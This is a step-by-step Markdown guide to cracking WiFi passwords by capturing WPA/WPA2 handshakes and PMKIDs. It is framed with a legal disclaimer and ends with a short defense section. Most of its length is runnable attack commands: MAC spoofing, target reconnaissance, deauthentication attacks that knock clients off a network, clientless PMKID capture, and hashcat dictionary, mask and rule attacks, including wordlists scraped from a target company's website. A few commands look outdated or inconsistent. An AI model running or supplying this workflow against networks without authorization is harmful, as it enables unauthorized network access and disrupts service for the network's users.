# Comprehensive EAPOL Handshake Capture & WiFi Password Cracking Guide

## ⚠️ LEGAL DISCLAIMER

**THIS GUIDE IS FOR EDUCATIONAL PURPOSES ONLY**

- Only test on networks you own or have explicit written authorization to test
- Unauthorized access to computer networks is illegal under laws like the Computer Fraud and Abuse Act (CFAA) in the US and similar laws worldwide
- This guide is intended for penetration testers, security researchers, and network administrators
- Unauthorized WiFi hacking can result in criminal prosecution, fines, and imprisonment
- Always obtain written permission before testing any network

---

## Table of Contents

1. [Introduction](#introduction)
2. [Prerequisites](#prerequisites)
3. [Phase 1: Environment Setup](#phase-1-environment-setup)
4. [Phase 2: Reconnaissance](#phase-2-reconnaissance)
5. [Phase 3: Capturing EAPOL Handshakes](#phase-3-capturing-eapol-handshakes)
6. [Phase 4: Validating Captures](#phase-4-validating-captures)
7. [Phase 5: Converting to Hashcat Format](#phase-5-converting-to-hashcat-format)
8. [Phase 6: Password Cracking with Hashcat](#phase-6-password-cracking-with-hashcat)
9. [Phase 7: Advanced Techniques](#phase-7-advanced-techniques)
10. [Troubleshooting](#troubleshooting)
11. [Defense & Mitigation](#defense--mitigation)

---

## Introduction

### What is EAPOL?

**EAPOL** (Extensible Authentication Protocol over LAN) is a network port authentication protocol used in WPA/WPA2/WPA3 networks. The WPA/WPA2 4-way handshake uses EAPOL frames to establish a secure connection between a client and access point.

### The 4-Way Handshake Process

```
Client                                    Access Point (AP)
  |                                              |
  |  1. ANonce (AP Nonce)                       |
  |<---------------------------------------------|
  |                                              |
  |  2. SNonce (Client Nonce) + MIC             |
  |--------------------------------------------->|
  |                                              |
  |  3. GTK (Group Temporal Key) + MIC          |
  |<---------------------------------------------|
  |                                              |
  |  4. ACK                                      |
  |--------------------------------------------->|
  |                                              |
```

**Why it matters:** The handshake contains encrypted data that can be captured and cracked offline if the password is weak.

---

## Prerequisites

### Hardware Requirements

1. **WiFi Adapter with Monitor Mode & Packet Injection**
   - Recommended chipsets:
     - **Atheros AR9271** (Alfa AWUS036NHA)
     - **Ralink RT3070** (Alfa AWUS036NH)
     - **Realtek RTL8812AU** (Alfa AWUS036ACH)
     - **MediaTek MT7612U** (Panda PAU09)

2. **Computer**
   - Linux OS (Kali Linux, Parrot OS, or any Linux with wireless tools)
   - Minimum 4GB RAM (16GB+ recommended for hashcat)
   - GPU (NVIDIA/AMD) for faster cracking (optional but highly recommended)

### Software Requirements

```bash
# Essential tools
sudo apt update
sudo apt install -y \
    aircrack-ng \
    hashcat \
    hcxtools \
    hcxdumptool \
    wireshark \
    tshark \
    macchanger \
    wireless-tools \
    net-tools
```

### Knowledge Requirements

- Basic Linux command line
- Understanding of WiFi protocols (WPA/WPA2)
- Network basics (MAC addresses, channels, SSID)
- Basic cryptography concepts

---

## Phase 1: Environment Setup

### 1.1 Identify Your WiFi Adapter

```bash
# List network interfaces
iwconfig

# List USB devices (if using USB adapter)
lsusb

# Check if adapter supports monitor mode
iw list | grep -A 10 "Supported interface modes"
```

Expected output should show `monitor` mode support.

### 1.2 Enable Monitor Mode

#### Method 1: Using airmon-ng (Recommended for beginners)

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Start monitor mode on interface (replace wlan0 with your interface)
sudo airmon-ng start wlan0

# Verify - you should see wlan0mon or similar
iwconfig
```

#### Method 2: Manual method

```bash
# Bring interface down
sudo ip link set wlan0 down

# Set monitor mode
sudo iw dev wlan0 set type monitor

# Bring interface up
sudo ip link set wlan0 up

# Verify
iwconfig wlan0
```

### 1.3 Optional: Change MAC Address

```bash
# Bring interface down
sudo ip link set wlan0mon down

# Change MAC address
sudo macchanger -r wlan0mon

# Bring interface back up
sudo ip link set wlan0mon up

# Verify new MAC
macchanger -s wlan0mon
```

---

## Phase 2: Reconnaissance

### 2.1 Scan for Networks

#### Using airodump-ng

```bash
# Scan all channels
sudo airodump-ng wlan0mon

# Scan specific channel (e.g., channel 6)
sudo airodump-ng --channel 6 wlan0mon

# Scan 2.4GHz band only
sudo airodump-ng --band bg wlan0mon

# Scan 5GHz band only
sudo airodump-ng --band a wlan0mon
```

**Key information to note:**
- **BSSID**: MAC address of the access point
- **PWR**: Signal strength (closer to 0 is better)
- **CH**: Channel number
- **ENC**: Encryption type (look for WPA/WPA2)
- **ESSID**: Network name
- **Clients**: Connected devices (STATION column)

### 2.2 Target Selection

Choose targets based on:
1. **Authorization** (most important!)
2. **Signal strength** (PWR > -70 for best results)
3. **Active clients** (easier to capture handshakes)
4. **Encryption type** (WPA2 is ideal, WPA3 is more difficult)

### 2.3 Detailed Target Analysis

```bash
# Focus on specific BSSID
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel X wlan0mon

# Save output to file
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel X -w capture wlan0mon
```

---

## Phase 3: Capturing EAPOL Handshakes

### 3.1 Method 1: Passive Capture (Wait for natural handshake)

```bash
# Start capture on target
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel X -w capture wlan0mon
```

**Wait for:**
- A client to connect naturally
- Look for "WPA handshake: XX:XX:XX:XX:XX:XX" in top-right corner

**Pros:** Stealthy, no network disruption
**Cons:** Can take hours or days

### 3.2 Method 2: Active Capture (Deauthentication Attack)

⚠️ **Warning:** Deauth attacks disrupt network service. Only use on authorized networks!

#### Single deauth packets (less aggressive)

```bash
# Terminal 1: Start capture
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel X -w capture wlan0mon

# Terminal 2: Send deauth to specific client
sudo aireplay-ng --deauth 5 -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
```

Where:
- `-a XX:XX:XX:XX:XX:XX` is the AP BSSID
- `-c YY:YY:YY:YY:YY:YY` is the client MAC address
- `--deauth 5` sends 5 deauth packets

#### Broadcast deauth (more aggressive)

```bash
# Deauth all clients on the AP
sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX wlan0mon
```

### 3.3 Method 3: Using hcxdumptool (Modern approach)

```bash
# Install if not present
sudo apt install hcxdumptool hcxtools

# Capture with automatic deauth
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Capture on specific channel
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1 --filterlist_ap=targets.txt --filtermode=2
```

**Create targets.txt:**
```
XX:XX:XX:XX:XX:XX
```

### 3.4 Verify Handshake Capture

```bash
# Check with aircrack-ng
aircrack-ng capture-01.cap

# You should see: "1 handshake" in the output
```

---

## Phase 4: Validating Captures

### 4.1 Using Wireshark

```bash
# Open capture file
wireshark capture-01.cap

# Filter for EAPOL packets
# In filter box: eapol
```

**Look for 4 EAPOL frames:**
1. Message 1: AP → Client (ANonce)
2. Message 2: Client → AP (SNonce + MIC)
3. Message 3: AP → Client (GTK + MIC)
4. Message 4: Client → AP (ACK)

**You need at least messages 2 and 3 to crack!**

### 4.2 Using tshark (command line)

```bash
# Display EAPOL packets
tshark -r capture-01.cap -Y "eapol" -V

# Count EAPOL packets
tshark -r capture-01.cap -Y "eapol" | wc -l
```

### 4.3 Using aircrack-ng validation

```bash
# Detailed handshake analysis
aircrack-ng -w /dev/null capture-01.cap

# Look for output like:
# 1 handshake(s) found
```

---

## Phase 5: Converting to Hashcat Format

### 5.1 Using hcxpcapngtool (Recommended)

```bash
# Convert capture to hashcat format
hcxpcapngtool -o capture.hc22000 capture-01.cap

# Or for multiple files
hcxpcapngtool -o combined.hc22000 *.cap

# Check the output
cat capture.hc22000
```

**Output format (hc22000):**
```
WPA*02*PMKID/MIC*MAC_AP*MAC_CLIENT*ESSID***NONCE_AP*EAPOL_CLIENT
```

### 5.2 Alternative: Using cap2hccapx (for older hashcat versions)

```bash
# Download cap2hccapx
wget https://raw.githubusercontent.com/hashcat/hashcat-utils/master/src/cap2hccapx.c
gcc -o cap2hccapx cap2hccapx.c
chmod +x cap2hccapx

# Convert
./cap2hccapx capture-01.cap capture.hccapx
```

### 5.3 Using aircrack-ng suite

```bash
# Extract to hccapx using online converter
# Upload to https://hashcat.net/cap2hashcat/
# Or use wlanhcx2ssid for hash extraction

wlanhcx2ssid capture.hc22000
```

---

## Phase 6: Password Cracking with Hashcat

### 6.1 Understanding Hash Modes

- **22000**: WPA-PBKDF2-PMKID+EAPOL (modern format - recommended)
- **2500**: WPA-EAPOL-PBKDF2 (deprecated)
- **16800**: WPA-PMKID-PBKDF2

### 6.2 Basic Dictionary Attack

```bash
# Using hashcat
hashcat -m 22000 capture.hc22000 /path/to/wordlist.txt

# With status updates
hashcat -m 22000 capture.hc22000 /path/to/wordlist.txt --status --status-timer=10
```

**Popular wordlists:**
- RockYou: `/usr/share/wordlists/rockyou.txt`
- CrackStation: https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
- SecLists: https://github.com/danielmiessler/SecLists

### 6.3 Attack Modes

#### Straight Attack (Mode 0)

```bash
hashcat -m 22000 -a 0 capture.hc22000 wordlist.txt
```

#### Combination Attack (Mode 1)

```bash
# Combine two wordlists
hashcat -m 22000 -a 1 capture.hc22000 wordlist1.txt wordlist2.txt
```

#### Brute-Force Attack (Mode 3)

```bash
# 8 lowercase letters
hashcat -m 22000 -a 3 capture.hc22000 ?l?l?l?l?l?l?l?l

# 8-10 mixed alphanumeric
hashcat -m 22000 -a 3 capture.hc22000 ?a?a?a?a?a?a?a?a -i --increment-min=8 --increment-max=10
```

**Charset reference:**
- `?l` = lowercase (abcd...xyz)
- `?u` = uppercase (ABCD...XYZ)
- `?d` = digits (0123456789)
- `?s` = special characters
- `?a` = all characters
- `?b` = binary (0x00 - 0xff)

#### Rule-Based Attack

```bash
# Using best64 rules
hashcat -m 22000 -a 0 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Using multiple rule files
hashcat -m 22000 -a 0 capture.hc22000 wordlist.txt -r rules1.rule -r rules2.rule

# Using dive.rule (more extensive)
hashcat -m 22000 -a 0 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/dive.rule
```

#### Hybrid Attacks (Mode 6 & 7)

```bash
# Wordlist + mask (append digits)
hashcat -m 22000 -a 6 capture.hc22000 wordlist.txt ?d?d?d?d

# Mask + wordlist (prepend digits)
hashcat -m 22000 -a 7 capture.hc22000 ?d?d?d?d wordlist.txt
```

### 6.4 Performance Optimization

```bash
# Use all GPUs
hashcat -m 22000 capture.hc22000 wordlist.txt -d 1,2,3

# Workload profile (1-4, higher = faster but system less responsive)
hashcat -m 22000 capture.hc22000 wordlist.txt -w 3

# Optimize workload
hashcat -m 22000 capture.hc22000 wordlist.txt -O

# Benchmark your system
hashcat -b -m 22000
```

### 6.5 Resume and Session Management

```bash
# Save session
hashcat -m 22000 capture.hc22000 wordlist.txt --session=mysession

# Resume session
hashcat --session=mysession --restore

# Remove completed session
rm ~/.hashcat/sessions/mysession.*
```

### 6.6 Viewing Results

```bash
# Show cracked passwords
hashcat -m 22000 capture.hc22000 --show

# Show in custom format
hashcat -m 22000 capture.hc22000 --show --outfile-format=2

# Output to file
hashcat -m 22000 capture.hc22000 wordlist.txt -o cracked.txt
```

---

## Phase 7: Advanced Techniques

### 7.1 PMKID Attack (Clientless)

**PMKID** allows attacking WPA2 without capturing handshakes or waiting for clients!

```bash
# Capture PMKID
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 --filterlist=targets.txt --filtermode=2

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

### 7.2 Generating Custom Wordlists

#### Using crunch

```bash
# Generate 8-character numeric passwords
crunch 8 8 0123456789 -o numbers.txt

# Generate passwords with pattern (@ = lowercase, % = numeric)
crunch 8 8 -t password%%% -o custom.txt

# Phone numbers pattern
crunch 10 10 0123456789 -t 555%%% -o phones.txt
```

#### Using CeWL (web scraper)

```bash
# Scrape words from website
cewl https://targetcompany.com -d 2 -m 8 -w custom_wordlist.txt

# Include email addresses
cewl https://targetcompany.com -d 2 -m 8 -e -w custom_wordlist.txt
```

#### Using Mentalist (GUI tool)

```bash
# Install
sudo apt install mentalist

# Run
mentalist
```

### 7.3 Creating Custom Rules

Create `custom.rule`:
```
# Append year
$2$0$2$4

# Append common suffixes
$!
$@
$#
$1$2$3

# Capitalize first letter
c

# Toggle case
t

# Duplicate
d

# Reverse
r

# Combination: capitalize + append year
c $2$0$2$4
```

Usage:
```bash
hashcat -m 22000 capture.hc22000 wordlist.txt -r custom.rule
```

### 7.4 Mask Attack Strategies

```bash
# Common 10-digit phone patterns
hashcat -m 22000 -a 3 capture.hc22000 ?d?d?d?d?d?d?d?d?d?d

# Capital letter + lowercase + numbers (Password123)
hashcat -m 22000 -a 3 capture.hc22000 ?u?l?l?l?l?l?l?l?d?d?d

# Using hashcat mask files
hashcat -m 22000 capture.hc22000 -a 3 masks.hcmask

# Common WiFi password patterns
hashcat -m 22000 -a 3 capture.hc22000 ?u?l?l?l?l?l?l?d?d  # Password12
hashcat -m 22000 -a 3 capture.hc22000 ?d?d?d?d?d?d?d?d?d?d  # 1234567890
```

### 7.5 Using HashCat Brain (distributed cracking)

```bash
# Start hashcat with brain server
hashcat -m 22000 capture.hc22000 wordlist.txt --brain-server --brain-server-timer=30

# Connect client to brain server
hashcat -m 22000 capture.hc22000 wordlist.txt --brain-client --brain-host=127.0.0.1 --brain-port=6863
```

### 7.6 Statistical Analysis for Password Generation

```bash
# Install PACK
git clone https://github.com/iphelix/pack.git
cd pack

# Analyze existing passwords
python statsgen.py wordlist.txt -o stats.txt

# Generate masks based on statistics
python maskgen.py stats.txt -o masks.hcmask

# Use generated masks
hashcat -m 22000 capture.hc22000 -a 3 masks.hcmask
```

---

## Troubleshooting

### Issue: "No handshake found"

**Solutions:**
1. Ensure clients are connected to the target AP
2. Increase deauth packet count (--deauth 20)
3. Try capturing on different channels
4. Check signal strength (PWR should be > -70)
5. Verify monitor mode is active: `iwconfig`

### Issue: "Monitor mode not supported"

**Solutions:**
1. Check adapter chipset compatibility
2. Install proper drivers:
   ```bash
   sudo apt install realtek-rtl88xxau-dkms
   ```
3. Try different USB port (USB 2.0 vs 3.0)
4. Update kernel and reboot

### Issue: "Hashcat not detecting GPU"

**Solutions:**
```bash
# Install NVIDIA drivers
sudo apt install nvidia-driver nvidia-cuda-toolkit

# Install AMD drivers
sudo apt install rocm-opencl-runtime

# Verify OpenCL
clinfo

# Check hashcat device detection
hashcat -I
```

### Issue: "Invalid EAPOL frame"

**Solutions:**
1. Capture might be corrupted - recapture
2. Check with multiple validation tools
3. Try different conversion tools (hcxpcapngtool vs cap2hccapx)
4. Filter out beacon frames:
   ```bash
   tshark -r capture.cap -Y "eapol" -w filtered.cap
   ```

### Issue: "Cracking too slow"

**Solutions:**
1. Use workload profile 3: `-w 3`
2. Enable optimization: `-O`
3. Use GPU instead of CPU
4. Reduce wordlist size (focus on likely passwords)
5. Use simpler rules or masks
6. Check GPU temperature and throttling

### Issue: "No clients connected to AP"

**Solutions:**
1. Wait for peak usage times (mornings, evenings)
2. Check if AP is actively used: `airodump-ng`
3. Try PMKID attack instead (no clients needed)
4. Verify you're targeting the correct BSSID

---

## Defense & Mitigation

### For Network Administrators

#### 1. Use Strong Passwords

```bash
# Generate strong random password
openssl rand -base64 32

# Or use diceware method
# https://www.eff.org/dice
```

**Requirements:**
- Minimum 16 characters
- Mix of uppercase, lowercase, numbers, symbols
- Avoid dictionary words
- Don't use personal information
- Change regularly

#### 2. Implement WPA3

```bash
# Check router for WPA3 support
# Enable WPA3-SAE (Simultaneous Authentication of Equals)
# Features:
# - Forward secrecy
# - Protection against offline dictionary attacks
# - Stronger encryption (192-bit in WPA3-Enterprise)
```

#### 3. Enable Additional Security Features

- **802.11w (Management Frame Protection)**: Prevents deauth attacks
- **MAC Address Filtering**: Whitelist known devices
- **Disable WPS**: Vulnerable to brute-force attacks
- **Hide SSID**: Minor security through obscurity
- **Disable remote administration**: Only allow local access

#### 4. Network Segmentation

```bash
# Create separate networks:
# - Guest WiFi (isolated from internal network)
# - IoT devices (separate VLAN)
# - Corporate (with 802.1X authentication)
```

#### 5. Monitoring & Intrusion Detection

```bash
# Use tools to detect WiFi attacks:
# - Kismet: Wireless network detector
# - Airodump-ng: Monitor for deauth attacks
# - Wids/WIPS: Wireless Intrusion Detection/Prevention

# Install Kismet
sudo apt install kismet

# Monitor for attacks
kismet -c wlan0mon
```

#### 6. Enterprise Solutions (802.1X)

```bash
# Implement WPA2/WPA3-Enterprise with RADIUS
# - Each user has unique credentials
# - Centralized authentication
# - Certificate-based authentication
# - Detailed logging and monitoring

# Example FreeRADIUS setup
sudo apt install freeradius
```

### For Penetration Testers

#### Professional Reporting

```bash
# Document findings:
# 1. Executive Summary
# 2. Vulnerability Details
# 3. Evidence (capture files, screenshots)
# 4. Risk Assessment
# 5. Remediation Recommendations
# 6. Timeline of activities
```

#### Responsible Disclosure

1. Report findings to network owner immediately
2. Don't share credentials publicly
3. Don't access resources beyond scope
4. Maintain confidentiality
5. Follow industry standards (OWASP, PTES, etc.)

---

## Quick Reference Commands

### Setup
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

### Reconnaissance
```bash
sudo airodump-ng wlan0mon
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X wlan0mon
```

### Capture
```bash
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X -w capture wlan0mon
sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX wlan0mon
```

### Convert
```bash
hcxpcapngtool -o capture.hc22000 capture-01.cap
```

### Crack
```bash
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 capture.hc22000 --show
```

---

## Additional Resources

### Documentation
- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [Hashcat Wiki](https://hashcat.net/wiki/)
- [WiFi Security Protocols](https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access)

### Wordlists
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [CrackStation](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [WiFi Passwords](https://github.com/kennyn510/wpa2-wordlists)

### Tools
- [hcxtools](https://github.com/ZerBea/hcxtools)
- [hashcat](https://hashcat.net/hashcat/)
- [aircrack-ng](https://www.aircrack-ng.org/)
- [Wireshark](https://www.wireshark.org/)

### Communities
- [r/netsec](https://reddit.com/r/netsec)
- [r/hacking](https://reddit.com/r/hacking)
- [HashCat Forum](https://hashcat.net/forum/)
- [Aircrack-ng Forum](https://forum.aircrack-ng.org/)

---

## Conclusion

This guide covers the complete workflow from reconnaissance to password cracking. Remember:

✅ **Always get authorization**
✅ **Use strong passwords on your networks**
✅ **Implement WPA3 when possible**
✅ **Monitor your networks for attacks**
✅ **Stay updated with security patches**

**Final Reminder:** Unauthorized network access is illegal. Use this knowledge responsibly to improve security, not compromise it.

---

**Guide Version:** 1.0
**Last Updated:** 2025-01-16
**Author:** Security Education
**License:** Educational Use Only

